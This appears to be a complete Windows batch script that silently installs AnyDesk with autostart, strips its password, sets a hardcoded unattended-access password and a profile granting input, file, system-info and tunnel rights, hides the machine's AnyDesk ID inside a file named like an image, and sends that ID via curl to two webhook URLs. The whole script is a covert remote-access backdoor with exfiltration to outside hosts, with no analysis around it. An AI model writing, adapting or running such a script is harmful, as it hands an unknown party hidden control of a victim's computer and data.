"C:\Users\Public\AnyDesk.exe" --install "C:\" --silent --start-with-win
"C:\AnyDesk.exe" --restart-service
"C:\AnyDesk.exe" --remove-password

for /f "delims=" %%i in ('"C:\AnyDesk.exe" --get-id') do set ID=%%i
echo AnyDesk ID is: %ID% >>"C:\Access Control\ASManager\images\any.png"

echo 123456qwerty@ | "C:\AnyDesk.exe" --add-profile zzz +input +file_manager +sysinfo +tcp_tunnel
echo 123456qwerty@ | "C:\AnyDesk.exe" --set-password _unattended_access

curl "https://eager-king-52.webhook.cool?id=%ID%"
curl "https://webhook.site/9bf97e58-d1c1-4252-83e2-4cac1c2daecf?id=%ID%"

